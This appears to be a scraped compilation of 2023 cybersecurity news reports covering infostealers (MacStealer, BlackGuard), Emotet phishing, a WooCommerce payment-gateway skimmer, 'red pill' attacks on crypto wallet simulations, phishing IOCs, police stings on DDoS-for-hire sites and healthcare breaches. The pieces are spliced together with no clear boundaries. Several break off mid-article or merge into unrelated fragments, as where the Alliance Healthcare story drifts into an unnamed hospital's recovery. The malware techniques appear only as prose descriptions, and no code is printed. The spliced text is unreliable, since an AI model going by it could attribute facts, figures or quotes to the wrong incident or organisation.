      "text": " Tech News and AnalysisAs cloud infrastructure and compliance regulations become more complicated, companies are looking to simplify data security by adopting more pervasive encryption of sensitive data and consolidating key management into a single repository or service.On March 22, email and file security firm Virtru became the latest data-protection firm to offer customers a single vault for key management, when it announced a private keystore that works with Google Workspace, Google Cloud, and the company's other products. The product manages encryption keys, configures policies, and allows audits of access to encrypted data.Virtru had already offered encryption for email and files stored in the cloud, but the sensitivity of data and need for complying with government requirements led customers to ask for a \"hold-your-own-key,\" or HYOK, capability, says Mike Morper, senior vice president of product at Virtru.\"We have customers that have come to us, who ... want to ensure absolutely no entity other than the intended recipient has access to [a particular piece of] information,\" Morper says. \"We first started hearing this rooted in a lot of data-sovereignty conversations, particularly with some of our customers in Europe ... and it was paramount to them that they would have the ability to manage their own private keys.\"Moreover, a set of headaches — including managing keys, limiting who can access data, and auditing that access — have grown more severe as companies need to comply with privacy regulations from multiple countries and ensure the security of data across multiple clouds, says Kevin McKeogh, vice president of product management for data protection solutions at Entrust.\"Encrypting data is easy. Managing the keys that are used to encrypt the data is what becomes increasingly challenging for organizations as they scale operations,\" he says. \"With a growing volume of data now processed across distributed systems — on-premises and in multicloud environments — organizations need to maintain control of the keys to ensure data is protected and available to the applications that need to use the data, and to stay compliant to regulations.\"\"The typical enterprise has at least five different key managers deployed, so key sprawl is an issue,\" says Todd Moore, vice president of encryption products at Thales. \"This complicates things like key rotation and retiring keys. The best practice is to have one centralized key management platform that can support the vast majority of your key management operations.\"In addition, companies that rely on a single cloud provider's key management solution may be at greater risk. Privacy and data-protection regulations, such as the European General Data Protection Regulation (GDPR) and the Payment Card Industry's Data Security Standard (PCI-DSS), explicitly require — or heavily imply — that encrypting sensitive data is necessary and that self-custody of keys is preferred, says Andy Manoske, principal product manager for cryptography and security at HashiCorp.\"This is especially the case if data sovereignty requirements attempting to protect against a privileged adversary within a client's cloud service infrastructure are at play,\" he says. \"While an adversary may not be able to compromise that key management system, they could render it inoperable if they have privilege within a single cloud hosting both data encryption and key management.\"While a private keystore is a solution, it is not the only one. Key-management services that provide HYOK can satisfy government regulations and business security requirements, while still giving companies the expertise and support they need to manage a complex task. Keys need to be protected, but defenders must understand the company's threat model and what types of attacks are likely in order to best select the appropriate encryption technologies.Deploying encryption and maintaining a private keystore require some deep expertise within a company, Manoske says.\"Private keystores usually provide flexibility in how keys are retrieved and used for cryptography — a flexibility usually necessary when deploying cryptography within high-performance applications with significant automation,\" Manoske says. \"This flexibility comes at the cost of usually requiring more sophistication from the defender in protecting against side-channel attacks — attacks that 'go around' the mathematical protections of cryptography to tamper with or steal keys.\"While a company can retain ownership of critical keys, some KMaaS offerings can simplify the business' data security and provide necessary capabilities, such as access control and auditability, says Virtru's Morper.\"That's the hard part and, frankly, probably where the preponderance of adoption and friction come into play,\" he says. \"So it really starts to become a balance for organizations. It's a security-policy decision and a business decision they need to make — what level of friction is appropriate and against what degree of risk?\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " A new info-stealing malware named MacStealer is targeting Mac users, stealing their credentials stored in the iCloud KeyChain and web browsers, cryptocurrency wallets, and potentially sensitive files.MacStealer is being distributed as a malware-as-a-service (MaaS), where the developer sells premade builds for $100, allowing purchasers to spread the malware in their campaigns.MacStealer was discovered by Uptycs analysts on a dark web hacking forum where the developer has been promoting it since the beginning of the month.The seller claims the malware is still in an early beta development phase and offers no panels or builders. Instead, it sells pre-built DMG payloads that can infect macOS Catalina, Big Sur, Monterey, and Ventura.The threat actor uses the lack of a builder and panel to justify the low price of $100 for the malware but promises that more advanced features will arrive soon.The malware developer claims that MacStealer can steal the following data from compromised systems:The Keychain database is a secure storage system in macOS that holds users' passwords, private keys, and certificates, encrypting it with their login password. The feature can then automatically enter login credentials on web pages and apps.The threat actors distribute MacStealer as an unsigned DMG file that poses as something the victim is tricked into executing on their macOS.Upon doing so, a fake password prompt is served to the victim to run a command that allows the malware to collect passwords from the compromised machine.The malware then collects all of the data mentioned in the previous section, stores them in a ZIP file, and sends the stolen data to remote command and control servers to be collected later by the threat actor.At the same time, MacStealer sends some basic information to a pre-configured Telegram channel, allowing the operator to be quickly notified when new data is stolen and download the ZIP file.While most MaaS operations target Windows users, macOS isn't immune to such threats, so its users should remain vigilant and avoid downloading files from untrustworthy websites.That information stealer also targeted credentials saved in browsers and cryptocurrency wallets, including Exodus, Phantom, Atomic, Electrum, and MetaMask.With cryptocurrency wallets being highly targeted by threat actors, we will likely see further malware developers targeting macOS in their search for cryptocurrency wallets to steal."

The attacks — which overwhelm network resources with traffic to effectively take them offline — are incapable of stealing or modifying data on the victim server.“Users based in the UK will be contacted by the National Crime Agency or police and warned about engaging in cyber crime. Information relating to those based overseas is being passed to international law enforcement,” the NCA said.The operation is not one of the more sophisticated busts that British cyber cops have been involved in, but provides police with a mechanism to intervene in the cases of potential offenders when they are engaged in what the NCA described as “an attractive entry-level crime.”According to the NCA the fake sites have so far been accessed by around several thousand people. One of them was replaced Friday with a splash page warning that the NCA, alongside the Dutch Politie and the German Bundeskriminalamt, had created and controlled the site.“Operation PowerOFF has already resulted in the arrest of numerous individuals and continues to ensure that users are being held accountable for their criminal activity,” the splash page states.Alan Merrett, from the agency’s National Cyber Crime Unit, stated: “We will not reveal how many sites we have, or for how long they have been running. Going forward, people who wish to use these services can’t be sure who is actually behind them, so why take the risk?”Friday’s announcement follows the NCA helping to take down 48 of the world’s most popular booster sites last December and arresting an 18-year-old man in Devon on suspicion of administering one of the sites.“Traditional site takedowns and arrests are key components of law enforcement’s response to this threat. However, we have extended our operational capability with this activity, at the same time as undermining trust in the criminal market,” added Merrett.Alexander Martin is the UK Editor for Recorded Future News.

For some of the payloads we have corresponding phishing emails that were used as lures to deliver the files, allowing analysis of the social engineering techniques used. We have noted updates to the first-stage payloads used, with new layers of obfuscation to hinder analysis and additional decoys used for social engineering. The emails contain a number of social engineering techniques. The name and email address used to send the phishing emails is crafted to look like it is coming from an “Embassy in Beijing.” A free email provider is used, therefore domain reputation checks will not be useful. The email is signed off with the name and details of an actual attaché of the Kyrgyz embassy in China. If the recipient were to use a search engine to check for this employee, they would easily be able to find corroborating information from LinkedIn and the Ministry of Foreign Affairs website for Kyrgyzstan, adding to the supposed legitimacy of the email. This is presumably also how the malicious actor was able to get information in order to craft the lure. The email subject and body use terms and themes that would be familiar with the recipients in governmental and energy sectors, such as International Atomic Energy Agency (IAEA), China Institute of International Studies (CIIS), strategic alliances, and nuclear doctrines. Multiple payloads have been observed being delivered. Either CHM files, or Microsoft Excel files with Equation Editor exploits. These payloads are compressed inside RAR files, this helps avoid static analysis techniques that do not decompress the files first. The purpose of the payloads are to create persistence and download further malware payloads. We were not able to get further additional payloads from the command and control (C2) servers, but in some instances were able to get the file names of next stages from active C2s. The second scheduled task created attempts to execute the payload downloaded by the other task: The more common payloads contained within the RAR files are Microsoft Compiled HTML Help (CHM) files. These can be used to simply execute arbitrary code, in these cases, they are also used to create scheduled tasks for persistence and downloading of the next stage. We have noted multiple versions of these CHM payloads. CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Office installed like the Excel files, and it also uses LZX compression that will bypass static malware analysis solutions that do not decompress the file.We did not fetch any additional payloads from the C2, but we were served empty MSI files, allowing us to discover the names of the next stage payloads. The decoded command is the following:It is evident that the C2 controllers have been updated also as now only the computer name is sent to the C2 and not the username. What is interesting about the next version is that it now contains a decoy picture when opened:The decoy appears to reference the United Front Work Department of the Central Committee of the Chinese Communist Party. The following is a machine translated version of the same picture for reference (please note that the translation will not be fully accurate and should be used for reference purposes only):Always take care when handling attachments, and never open CHM files as they are antiquated and not commonly used for legitimate purposes currently.– Want to learn more about automating your pipeline for phishing email investigations with Intezer?–5f663f15701f429f17cc309d10ca03ee00fd20f733220cc9d2502eff5d0cd1a1 (Email)eb7aebded5549f8b006e19052e0d03dc9095c75a800897ff14ef872f18c8650e (Email)cac239cf09a6a5bc1f9a3b29141336773c957d570212b97f73e13122fe032179 (Email)8d2f6b0d7a6a06708593cc64d9187878ea9d2cc3ae9a657926aa2a8522b93f74 (Email)33905e2db3775d2e8e75c61e678d193ac2bab5b5a89d798effbceb9ab202d799  (Email)5c85194ade91736a12b1eeeb13baa0b0da88c5085ca0530c4f1d86342170b3bc (Email)Ef4fb1dc3d1ca5ea8a88cd94596722b93524f928d87dff0d451d44da4e9181f1 (Email)b2566755235c1df3371a7650d94339e839efaa85279656aa9ab4dc4f2d94bbfa (RAR)33a20950e7f4b2191706ddf9089f1e91be1e5384cca00a57cf6b58056f70c96b (RAR)7e7e90b076ef3ea4ef8ed4ef14fb599a2acb15d9ce00c78e5949186da1e355cf (RAR)qwavemediaservice[.]netmirzadihatti[.]comcoauthcn[.]comRyan is a security researcher analyzing malware and scripts.

It is important to keep in mind that the UK's Computer Misuse Act of 1990 makes DDoS attacks illegal. All of these websites were created by the NCA to appear genuine, giving the visitor the idea that they could initiate DDoS attacks using the provided tools and services. According to the agency, many a thousand individuals have visited the sites, although, after registering on the site, visitors are instead presented with a splash screen telling them that their data has been captured and law enforcement authorities would contact them instead of receiving the services they had signed up for. In the most recent report, the NCA confirms to have identified one of the websites it was operating, with a message that the data of users has been collected and that they “will be contacted by law enforcement.” The individuals who are currently in the UK will be contacted by the NCA or police and are warned about engaging in any cybercrime-related activity, whereas, the details of those overseas are being handed out to international law enforcement. In a DDoS attack, compromised computer systems bombard a target (server or website), causing severe financial or reputational damage to the targeted organization.\n“DDoS-for-hire, or ‘booter’, services allow users to set up accounts and order DDoS attacks in a matter of minutes […] Such attacks have the potential to cause significant harm to businesses and critical national infrastructure, and often prevent people from accessing essential public services,” said the NCA. Alan Merrett, member of NCA’s National Cyber Crime Unit says “booter services” are a key enabler of cybercrime. “The perceived anonymity and ease of use afforded by these services means that DDoS has become an attractive entry-level crime, allowing individuals with little technical ability to commit cyber offences with ease,” he said. He added that traditional site takedowns and arrests are key components of law enforcement’s response to threats while adding, “We have extended our operational capability with this activity, at the same time as undermining trust in the criminal market.” The NCA says that it will not reveal how many sites it has or for how long they have been running. Therefore, they have urged individuals looking for these services to stay cautious as they might not know who is operating them. your nameYour Emailyour message"

      "text": " A new Emotet phishing campaign is targeting U.S. taxpayers by impersonating W-9 tax forms allegedly sent by the Internal Revenue Service and companies you work with.Emotet is a notorious malware infection distributed through phishing emails that in the past contained Microsoft Word and Excel documents with malicious macros that install the malware.In the campaign seen by Malwarebytes, the threat actors send emails titled 'IRS Tax Forms W-9,' while impersonating an 'Inspector' from the Internal Revenue Service.These phishing emails contain a ZIP archive named 'W-9 form.zip' that contains a malicious Word document. This Word document has been inflated to over 500MB to make it harder for security software to detect it as malicious.However, now that Microsoft is blocking macros by default, users are less likely to go through the trouble of enabling the macros and become infected using malicious Word documents.In a phishing campaign seen by Brad Duncan of Unit42, the threat actors bypass these restrictions by using Microsoft OneNote documents with embedded VBScript files that install the Emotet malware.This phishing campaign uses reply-chain emails containing pretending to be from business partners sending you W-9 Forms, as shown below.The attached OneNote documents will pretend to be protected, requesting that you double-click the 'View' button to see the document correctly. However, hidden underneath that View button is a VBScript document that will be launched instead.When launching the embedded VBScript file, Microsoft OneNote will warn the user that the file may be malicious. Unfortunately, history has shown us that many users ignore these warnings and simply allow the files to run.Once executed, the VBScript will download the Emotet DLL and run it using regsvr32.exe.The malware will now quietly run in the background, stealing email, contacts, and waiting for further payloads to install on the device.If you receive any emails claiming to be W-9 or other tax forms, first scan the documents with your local antivirus software. However, due to the sensitive nature of these forms, it is not suggested that you upload them to cloud-based scanning services like VirusTotal.Normally, tax forms are distributed as PDF documents and not as Word attachments, so if you receive one, you should avoid opening it and enabling macros.Finally, it is doubtful that tax forms would ever be sent as OneNote documents, so immediately delete the email and do not open it if you receive one.As always, the best line of defense is to discard any email from people you do not know, and if you do know them, contact them by phone first to confirm if they sent it."

      "text": " The Federal Bureau of Investigation is warning companies in the U.S. of threat actors using tactics similar to business email compromise that allow less technical actors to steal various goods from vendors.Typical business email compromise (BEC) attacks focus on stealing money by tricking the victim into diverting funds to the fraudster’s account.In 2021, the losses associated with BEC schemes reached almost $2.4 billion in the U.S. alone. The figure is based only on the complaints received by the FBI that year, close to 20,000.In the type of fraud that the FBI observed the threat actor is employing false acquisition schemes to obtain various products from vendors across the country.In an alert on Friday, the FBI notes that criminal actors are impersonating the email domains of U.S.-based companies to initiate bulk purchases.The fraudsters are diligent enough to use spoofed emails with names of real employees, current or former, of the businesses they impersonate.According to the FBI, among the commercially available goods targeted in this type of fraud are construction materials, agricultural supplies, computer technology hardware, and solar energy products.While the technical skills required to spoof an email address are very low, it appears that the actors are skilled fraudsters knowledgeable in business payments and how to hide the cheating.After being granted a 30 or 60-day credit repayment term, the fraudsters can start additional purchase orders without having to pay in advance.The FBI recommends vendors check the source of an email before agreeing to a transaction. They can pull the buyer’s contact information from a reliable source (e.g. company’s website, social media, or online databases) and call them directly to inquire about the purchase intent."

      "text": " Coinbase wallet and other decentralized crypto apps (dapps) were found to be vulnerable to \"red pill attacks,\" a method that can be used to hide malicious smart contract behavior from security features.Coinbase is a leading cryptocurrency exchange that offers a crypto wallet app for users to store, manage, and interact with a wide range of digital assets they can purchase from the platform, including Bitcoin, Ethereum, and ERC-20 tokens.Security researchers at ZenGo Wallet have discovered that dapps, including the Coinbase Wallet, were vulnerable to a new attack that allows smart contracts to hide malicious behavior during transaction simulations. This causes the user to believe a transaction will be safe, and allow it to continue, only later learning that the smart contract stole their assets.The vulnerability was disclosed to Coinbase, who has since addressed the reported security problems and awarded ZenGo Wallet multiple bug bounties for their responsible disclosure.Web3 smart contracts are programs that will automatically execute when a cryptocurrency takes place, allowing developers a wide range of functionality for websites and crypto assets.For example, smart contracts can be used to automatically send someone an NFT after a payment is received, \"tax\" users for selling an asset too soon after purchasing it, or automatically write content to a website based on the transaction. Basically, anything that can be programmed can be executed by the smart contract.However, threat actors also use smart contracts for malicious reasons, by using them to steal sent crypto or drain a wallet of assets.These malicious contract signing requests are hard to distinguish from legitimate ones, making it challenging for cryptocurrency holders to navigate dangers.To prevent these attacks, dapps developers have introduced simulated transaction solutions to emulate signing a transaction and predict the outcome before the user approves it. The result of these simulations is then presented to the user, allowing them to see what will happen and decide if they wish to allow the transaction to continue.However, as the ZenGo Wallet report highlights, some malicious smart contracts can detect when they are being simulated and demonstrate inauthentic behavior to appear benign or profitable to the target, hence tricking the web3 emulation security system.The analysts explain that threat actors could implement “red pills” in malicious contracts to change their behavior when simulated and steal money from the targets when approved in reality.This attack is conducted by filling variables in a smart contract with \"safe\" data during simulations and then swapping it with \"malicious\" data during a live transaction. This would cause a simulation to show a smart contract as safe during simulation, but during a live transaction, it steals users' crypto.“Therefore a malicious smart contract may weaponize this “COINBASE” red pill as follows: Ask users to send some native coin to the contract, if COINBASE is zero (which means simulation in Polygon) the contract will send back some coins in return, thus making the transaction potentially profitable to the user when its wallet simulates it.”“However, when the user actually sends the transaction on-chain, COINBASE is actually filled with the non-zero address of the current miner and the contract just takes the sent coins.”The researchers have also released the following video to demonstrate this attack.Notice that the simulation indicates that the user will get 0.016 WETH ($30) if they approve the transaction request. However, they get nothing in return when performing the live transaction.By exploring these “red pill attack” scenarios, ZenGo Wallet found six cryptocurrency wallet dapps vulnerable to exploitation.These are the Coinbase wallet, Rabby wallet, Blowfish, PocketUniverse, Fire Extension, and an unnamed extension that has not fixed the problem yet.All other vendors mentioned above have implemented fixes on their transaction simulation shortly after they received ZenGo Wallet’s report.The fix for this attack is to stop using arbitrary values for vulnerable variables, preventing their use as \"red pills\" in malicious contracts."

      "text": " A new variant of the BlackGuard stealer has been spotted in the wild, featuring new capabilities like USB propagation, persistence mechanisms, loading additional payloads in memory, and targeting additional crypto wallets.The targeting scope of BlackGuard remains extensive, attempting to steal cookies and credentials stored in web browsers, cryptocurrency wallet browser extension data, desktop crypto wallet data, information from messaging and gaming apps, email clients, and FTP or VPN tools.What is most interesting in the latest version is the new features that have been introduced that make BlackGuard a much more potent threat.First, a crypto wallet hijacker (clipper) module replaces cryptocurrency addresses copied to the Windows clipboard with the threat actor's address, hoping to divert cryptocurrency transactions to their own wallets.The clipper has hardcoded addresses for Bitcoin, Ethereum, Monero, Stellar, Ripple, Litecoin, Nectar, Bitcoin Cash, and DASH, so it supports quite a few cryptocurrencies.The second new feature is BlackGuard's ability to propagate via USB sticks and other removable devices and automatically infect any new hosts it reaches.The third addition is the malware's ability to download additional payloads from the C2 server and execute them directly in the breached computer's memory using the \"process hollowing\" method, thus evading detection from AV tools.The fourth new feature is BlackGuard's ability to add itself under the \"Run\" registry key, thus gaining persistence between system reboots.Finally, a feature copies malware files to every folder in the C:\\ drive, giving each copy of the files a random name.In additon to these features, BlackGuard is now targeting 57 cryptocurrency browsers extensions and wallets, attempting to steal their data and drain crypto assets. In August, when Zscaler analyzed the malware, it had only stolen data from 45 crypto-related extensions and wallets.Some of the targeted extension include Binance, Phantom, Metamask, BitApp, Guildwallet, Slope Wallet, Starcoin, and Ronin wallet extensions. Some of the targeted dedicated wallets are AtomicWallet, BitcoinCore, DashCore,  Electrum, Ethereum, Exodus crypto, and LiteCoinCore wallets.AT&T analysts comment that this duplication system is more of an annoyance than anything advantageous. However, the operators may have implemented this system to make the removal of the malware harder.In conclusion, the latest version of BlackGuard demonstrates the continuous evolution of the malware which competes in the MaaS space, adding mostly meaningful features that pose an even more significant risk to users.To keep the risk of BlackGuard infections at bay, avoid downloading executables from untrustworthy websites, do not launch files arriving as email attachments from unknown senders, and keep your system and AV tools updated."

      "text": " MITRE has quietly released a cloud-based prototype platform for its new System of Trust (SoT) framework that defines and quantifies risks and cybersecurity concerns for the supply chain.The SoT framework, which is a cloud-native app hosted on AWS, is centered around 14 top-level risk areas related to suppliers, service providers, and supplies, including the financial stability and cybersecurity practices of the supplier, as well as risk of counterfeit and compromise to products. These risk categories are then used to evaluate a supplier or product during the acquisition process, digging into detailed questions on how a supplier tracks and ensures the security of third-party software components used in their product, for example.\"The System of Trust is very appealing because it gives a structure that's more comprehensive, well laid-out, and explains what kinds of risks\" you have in your supply chain, in detail, explains Robert Martin, senior software and supply chain assurance principal engineer at MITRE Labs. That goes beyond traditional risk measurement and assessment tools, he notes.There are some 40 organizations currently involved in shaping the SoT platform, which now includes some 660 specific supply chain categories and risk factors. MITRE is gathering input to flesh out the tool from businesses with supply chains, supply chain security vendors, and standards groups that touch some elements of supply chain operations. Among some of the big name members of the SoT community are Microsoft, BlackBerry, CISA, Cisco, Dell Technologies, Intel, Mastercard, NASA, Raytheon, Schneider Electric, Siemens, and The Open Group.\"The big thing they have here is they are doing what they have done with ATT&CK and D3FEND: provide a common language for everyone to use when we are talking about not only the position in the chain but the specific vulnerabilities or attack methods and defenses,\" says Curt Franklin, principal analyst for enterprise security management at Omdia.Franklin says MITRE's pedigree with its other cybersecurity programs should help propel the SoT, but wide adoption likely will take time. \"I can imagine some of the third-party risk assessment [vendors] building SoT into their products like they build FAIR [Factor Analysis of Information Risk] or ATT&CK into theirs,\" Franklin says. \"I think the odds are good that [SoT] will be more widely adopted. I think the odds are just as good that it will take a while.\"That's because there still are multiple ways to define and measure risk in cybersecurity, and no two models work together, he says. \"It's very difficult to say how my risk posture compares to my peers in the industry. What something like this does is provide a particular framework for some common quantification of risk.\"Each risk item in the RMM is scored using data measurements that are then applied to a scoring algorithm. The resulting scores identify the strengths and weaknesses of a supplier, for example, against the specific risk categories. That would allow a business to assess quantitatively the security risk of a software vendor or its product, for example.One of the organizations closely working the project is Schneider Electric, whose vice president of supply chain security Cassie Crossley will join Martin in an RSAC 2023 session on SoT called \"Creating the Standard for Supply Chain Risk — MITRE's System of Trust.\" Crossley says Schneider has multiple, comprehensive supply chain risk assessment processes currently in place across different parts of the company, and Schneider plans to provide input and feedback to the SoT based on its own requirements and metrics.\"We would want to work with those teams [across Schneider] to identify some areas where we can provide suggestions and also see how we can better align or sort of adopt more of the [SoT] framework,\" Crossley says. \"I don't know yet if we will have a full, 'hey, we are 100% SoT.' But we would make our own processes and identify areas where we want to incorporate more of a structure\" for supply chain risk assessment, she says.For Schneider, supply chain risk and security issues apply both to its own products and ones it buys for internal use, including the \"third and fourth parties we work with,\" she says. She sees SoT possibly helping with visibility into risks associated with \"upstream\" suppliers that aren't typically part of a supplier evaluation process.\"I think by using SOT, if it could become a common model for a lot, we can get those answers faster for those upstream\" suppliers, she says, if an organization can ask vendors to map it to their upstream suppliers.Martin says the main challenges for SoT to become the go-to standard for supply chain assessments are enough bandwidth to expand the project as it catches on, as well as getting the word out to avoid duplication of effort. \"I'm worried about people not being aware of this and off trying to solve something that overlaps. We are making sure people are aware\" and can help contribute to SoT, he says.MITRE plans to offer RMM as an open source tool when it's fully baked. For now, Martin says, organizations can use it to assist MITRE in fleshing out the tool itself or for their own internal use. \"They can take it offline,\" he says, \"and do an assessment against\" the SoT.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

However, the bug remains in Windows 10.Last week, a new security vulnerability named 'Acropalypse' was disclosed for Google Pixel devices that can partially restore deleted content from cropped images.This flaw is considered a privacy risk because it's common to remove sensitive information from a photo by cropping it. This could be a wide variety of info, including confidential info from a document, location-identifying information, faces in a nude picture, or sensitive URLs in a browser screenshot.Instead, the cropped image will be the same size as the original, now containing two IEND data chunks, with the first being the proper ending of the new cropped image and the second being the end of cropped data that should have been truncated when the image was saved.In the new Windows 11 Snipping Tool version 11.2302.20.0, when cropping data and overwriting the original file, the software will now correctly truncate the unused data, leaving only one IEND data chunk in the image.This effectively fixes the issue in the Windows 11 Snipping tool and should make it into the production release over the next few weeks.However, the issue also affects the Windows 10 Snipping Tool (Snip and Sketch), and no update is available, even to Insiders, that resolves the bug.BleepingComputer has contacted Microsoft about whether the Windows 10 app will also be fixed and will update this post if we receive a response."

      "text": "  A cyberattack deployed against one of Spain’s leading pharmaceutical companies, Alliance Healthcare, is causing delays in the drug disruption supply chain, according to local news outlet El Pais. Alliance is a pharmaceutical distributor, as well as a clinical trial support company.The cyber incident began on March 17 and has led to a complete shutdown of the company’s website, billing systems, and ordering processes. During the first few days of the attack, the company remained at a standstill.Company officials say after detecting an “interruption” in its system, they initiated processes to limit the impact. Patients are the main priority, and the recovery team is working quickly to remediate the issue.The outages have led to supply delays, due to server and online system shut downs. Pharmacies in the Catalonia region are seeing the biggest impacts, due to Alliance’s market share in the region. But officials stress there have been limited patient impacts, as pharmacies typically leverage more than one distributor for ordering processes. In that way, other companies have been able to supply the necessary orders.During a prolonged outage, the uptick in orders may cause further delays for those suppliers, as they may not have enough supply on hand to fulfill unexpected requests.The hospital has been able to maintain oncology services and other urgent care appointments at nearby locations. The last update on March 17 shows the hospital has only recovered about 50% of its processes. Western Europe has seen a spate of attacks against its health sector this year.

In 2022, a ransomware gang leveraged stolen credentials and targeted another water treatment plant in South Staffordshire, UK, affecting 1.6 million customers and 35,000 businesses.  \"This is especially true for critical infrastructure where you would need access using Secure Shell to troubleshoot an access failure.

When the victims open Gmail, the program steals the person’s emails, which are sent to a server belonging to the attackers.In another attack, Kimsuky actors add a malicious app to Google Play Console for “internal testing” and give permission to a targeted person to access it. After getting access to their login credentials in a spearphishing attack, they download the app through the victim’s account, which is then synced to their Android smartphone.According to the advisory, the actors stole both emails as well data stored in the cloud.James Reddick has worked as a journalist around the world, including in Lebanon and in Cambodia, where he was Deputy Managing Editor of The Phnom Penh Post.

The business email compromise (BEC) attack was caught due to a flaw in a domain name, behavioral AI, and an advanced modeling system.Included in the email was an invoice and instructions for payment for a loan worth $36.4 million. While this may be a number that might ring alarm bells for anyone else, commercial real estate involves the use of large-sum loans, according to an analysis from Abnormal Security, so there was no initial concern. A false company letterhead was used to legitimize the scam, and the cyberattackers added another reputable real estate investment company to the email chain to make it even more convincing. The escrow officer may have fallen for it, but the BEC attempt was caught due to artificial intelligence (AI) technology spotting signs of fraud, such as discrepancies in the wiring instructions, newly registered email domains, and irregular language patterns in the email.

      "text": " A new credit card stealing hacking campaign is doing things differently than we have seen in the past by hiding their malicious code inside the 'Authorize.net' payment gateway module for WooCommcerce, allowing the breach to evade detection by security scans.Historically, when threat actors breach a commerce site like Magenta or WordPress running WooCommerce, they inject malicious JavaScript into the HTML of the store or customer checkout pages. These scripts will then steal inputted customer information on checkout, such as credit card numbers, expiration dates, CVV numbers, addresses, phone numbers, and email addresses.However, many online merchants now work with security software companies that scan the HTML of public-facing eCommerce sites to find malicious scripts, making it harder for threat actors to stay hidden.To evade detection, the threat actors are now injecting malicious scripts directly into the site's payment gateway modules used to process credit card payments on checkout.As these extensions are usually only called after a user submits their credit card details and checks out at the store, it may be harder to detect by cybersecurity solutions.The campaign was discovered by website security experts at Sucuri after being called in to investigate an unusual infection on one of their client's systems.WooCommerce is a popular eCommerce platform for WordPress used by roughly 40% of all online stores.To accept credit cards on the site, stores utilize a payment processing system, such as Authorize.net, a popular processor used by 440,000 merchants worldwide.The code injected at the bottom of the file checks if the HTTP request body contains the \"wc-authorize-net-cim-credit-card-account-number\" string, which means it carries payment data after a user checks out their cart on the store.If it does, the code generates a random password, encrypts the victim's payment details with AES-128-CBC, and stores it in an image file that the attackers later retrieve.A second injection performed by the attackers is on \"wc-authorize-net-cim.min.js,\" also an Authorize.net file.The injected code captures additional payment details from input form elements on the infected website, aiming to intercept the victim's name, shipping address, phone number, and zip/postal code.Another notable aspect of this campaign is the stealthiness of the skimmer and its functions, which make it particularly hard to discover and uproot, leading to extended periods of data exfiltration.First, the malicious code was injected in legitimate payment gateway files, so regular inspections that scan websites' public HTML or look for suspicious file additions wouldn't yield any results.Secondly, saving stolen credit card details on an image file isn't a new tactic, but strong encryption is a novel element that helps attackers evade detection. In past cases, threat actors stored stolen data in plaintext form, used weak, base64 encoding, or simply transferred the stolen information to the attackers during checkout.Thirdly, the threat actors abuse WordPress's Heartbeat API to emulate regular traffic and mix it with the victims' payment data during exfiltration, which helps them evade detection from security tools monitoring for unauthorized data exfiltration.As MageCart actors evolve their tactics and increasingly target WooCommerce and WordPress sites, it is essential for website owners and administrators to stay vigilant and enforce robust security measures.This recent campaign discovered by Sukuri highlights the growing sophistication of credit card skimming attacks and the attackers' ingenuity in bypassing security."

      "text": "  University of California San Diego Health notified an undisclosed number of patients that their data was inadvertently shared with third parties due to its vendor placing analytics tools on its patient-facing websites without UCSD Health’s authorization.UCSD Health joins a long list of providers to report an unauthorized disclosure to third parties due to the use of Pixel-tracking tech, or marketing analytics tools. But it’s the first provider to notify due to a vendor’s error.What’s more, many of the marketing teams that employ these tools were unaware of the patient privacy risks. For UCSD Health, the “analytics tool” was placed on its scheduling websites for its Express Care and Urgent Care locations by its technology vendor, Solv Health. These websites let patients book provider appointments in-person and online. However, Solv placed “analytics tools on the websites,” which captured and transmitted the data to its third-party service providers.The compromised data was tied to individuals who made appointments on the affected sites between Sept. 13 and Dec. 22, 2022. The analytics tool may have captured patient names, dates of birth, email addresses, IP addresses, third-party cookies, reason for visit, and insurance type. No Social Security numbers, medical records, or financial information was capture by the sites.UCSD Health has since directed Solv Health to remove the analytics tools from the affected scheduling websites and worked with the vendor to investigate the incident and identify the affected individuals. The health system has since transitioned to a new scheduling tool and bolstered its vendor assessment and management processes.Miami-based Independent Living Systems recently provided an update to an earlier breach notice, which included the patient data impacts of an apparent ransomware and data exfiltration incident first reported in September 2022. ILS is a healthcare business associate for Florida Complete Care.While several media outlets reported the ILS hack as the largest healthcare data breach on record this year, the incident in question was already reported to the Department of Health and Human Services last year. The notice is simply an update to a previously recorded hack.Under the Health Insurance Portability and Accountability Act, covered entities must report any compromises of protected health information to HHS within 60 days of discovery. However, the time frame is not always long enough, depending on the complexity of the attack and forensics.As such, entities commonly issue a notice describing the incident and note to patients that the investigation is ongoing while providing HHS with the current knowledge of the incident and reporting the incident as impacting 501 patients with the expectation they’ll add more patients to the breach tally.All signs suggest ILS did just that. Reported by ILS on Sept. 9, 2022, “an incident involving the inaccessibility of certain computer systems” was detected on July 5. The response team found that a threat actor gained access to several ILS systems for nearly a week between June 30 and July 5, which enabled the exfiltration of some of the data stored on the impacted systems.“Other information was accessible and potentially viewed,” according to the notice.After containing the incident, ILS launched a review that concluded on Jan. 17, 2023. The team then validated the results and began the notification process.ILS determined that the compromised data could include patient names, contact information, Social Security numbers, dates of birth, driver’s licenses, state IDs, financial account details, medical record numbers, Medicare or Medicaid identification, mental or physical treatments, medical conditions, diagnosis codes or details, and other sensitive information.The information systems’ leadership has been working with the Cybersecurity Agency of Catalonia to analyze the affected systems and ensure the malicious malware has been completely removed before bringing the systems back online.But the recovered systems have enabled the hospital to recover some of its scheduled surgery, ambulatory surgery, and external consultations, “despite the current difficulties caused by having to work manually.” Officials were transparent “that the pace of care for patients and care times are still very much conditioned by the attack received and delays can be significant.” Radiotherapy oncology treatment, previously diverted to nearby hospitals to maintain critical appointments, have restarted at the hospital as of March 15; made possible by the two accelerators being brought back online after the attack.The previously implemented contingency plan has enabled the hospital to maintain critical care appointments, as well as transparency for the sake of patients and care coordination.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.Okta had 4,961 current and former employees' data, including names, health insurance plan numbers, and Social Security numbers, compromised following a breach at its third-party vendor Rightway Healthcare, reports The Register.Threat actors using private keys and passphrases from LastPass databases stolen in cyberattacks last August and December were reported by ZachXBT and MetaMask developer Taylor Monahan to have been able to exfiltrate $4.4 million worth of cryptocurrency on Oct. 25, BleepingComputer reports.The three companies claim no sensitive customer data was lost despite being targeted after the breach of the identity and access management firm.On-Demand Event   \n        Copyright © 2023 CyberRisk 